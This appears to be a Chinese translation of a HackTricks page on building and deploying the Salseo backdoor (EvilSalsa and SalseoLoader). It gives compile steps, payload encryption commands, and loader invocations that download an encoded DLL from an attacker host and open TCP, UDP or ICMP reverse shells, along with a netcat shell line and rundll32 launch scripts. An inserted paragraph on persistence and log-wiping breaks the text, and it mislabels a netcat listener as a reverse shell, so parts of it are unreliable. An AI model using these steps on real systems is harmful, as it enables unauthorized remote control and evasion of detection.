# Salseo

<details>

<summary><strong>从零到英雄学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>

## 编译二进制文件

从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。你需要安装**Visual Studio**来编译代码。

为你将要使用它们的windows盒子的架构编译这些项目（如果Windows支持x64，为那个架构编译它们）。

你可以在Visual Studio的左侧**"Build"标签**中**"Platform Target"**选择架构。

（**如果你找不到这个选项，点击**"Project Tab"**然后点击**"\<Project Name> Properties"**）

![](<../.gitbook/assets/image (132).png>)

然后，构建两个项目（Build -> Build Solution）（日志中会显示可执行文件的路径）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 准备后门

首先，你需要编码**EvilSalsa.dll**。为此，你可以使用python脚本**encrypterassembly.py**，或者你可以编译项目**EncrypterAssembly**：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Windows操作系统是全球最广泛使用的桌面操作系统。由于其普及性，它成为黑客攻击的主要目标之一。在Windows系统中植入后门可以让攻击者长期控制目标系统。

#### 创建后门

在Windows中创建后门的一种常见方法是使用`netcat`。`netcat`是一个功能强大的网络工具，可以用于监听端口、连接到服务以及传输数据。

例如，以下命令将在目标机器上打开一个反向shell，允许攻击者远程执行命令：

```
nc -lvp 4444 -e cmd.exe
```

#### 维持访问

为了确保即使在系统重启后也能保持对目标系统的访问，攻击者通常会在系统中创建持久性机制。这可以通过多种方式实现，例如注册表键值、计划任务或服务。

#### 清理痕迹

在执行任何后门操作后，清理痕迹是至关重要的。这包括删除系统日志、清除命令历史记录以及隐藏文件和进程。

#### 检测和防御

检测Windows后门通常涉及监控异常网络流量、检查系统日志以及使用反病毒软件。防御措施包括定期更新系统、使用复杂密码以及限制对敏感资源的访问。

通过了解这些技术，安全专家可以更好地保护系统不受未经授权的访问和操控。
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
## **执行后门**

### **获取TCP反向Shell（通过HTTP下载编码的dll）**

记得启动nc作为反向Shell监听器和一个HTTP服务器来提供编码的evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向Shell（通过SMB下载编码的dll）**

记得启动nc作为反向Shell监听器，以及一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取 ICMP 反向 shell（编码后的 dll 已在受害者内部）**

**这次你需要在客户端下载一个特殊工具来接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用 ICMP 回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 将 SalseoLoader 编译为导出 main 函数的 DLL

使用 Visual Studio 打开 SalseoLoader 项目。

### 在 main 函数之前添加：\[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 为此项目安装 DllExport

#### **工具** --> **NuGet 包管理器** --> **为解决方案管理 NuGet 包...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **搜索 DllExport 包（使用浏览标签），然后按安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)

在您的项目文件夹中出现了文件：**DllExport.bat** 和 **DllExport\_Configure.bat**

### **卸载** DllExport

按 **卸载**（是的，这很奇怪，但相信我，这是必要的）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **退出 Visual Studio 并执行 DllExport\_configure**

只需**退出** Visual Studio

然后，转到您的 **SalseoLoader 文件夹** 并**执行 DllExport\_Configure.bat**

选择 **x64**（如果您要在 x64 系统中使用，那是我的情况），选择 **System.Runtime.InteropServices**（在 **Namespace for DllExport** 中）并按 **应用**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **再次使用 Visual Studio 打开项目**

**\[DllExport]** 应该不再标记为错误

![](<../.gitbook/assets/image (8) (1).png>)

### 构建解决方案

选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）

![](<../.gitbook/assets/image (10) (1).png>)

选择 **x64 平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新 DLL 的路径）

### 测试生成的 Dll

复制并粘贴 Dll 到您想要测试的地方。

执行：
```
rundll32.exe SalseoLoader.dll,main
```
如果没有出现错误，那么你可能已经有了一个功能性的DLL！

## 使用DLL获取shell

不要忘记使用一个**HTTP** **服务器**并设置一个**nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### 命令提示符(CMD)
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>零基础学习AWS黑客攻击成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
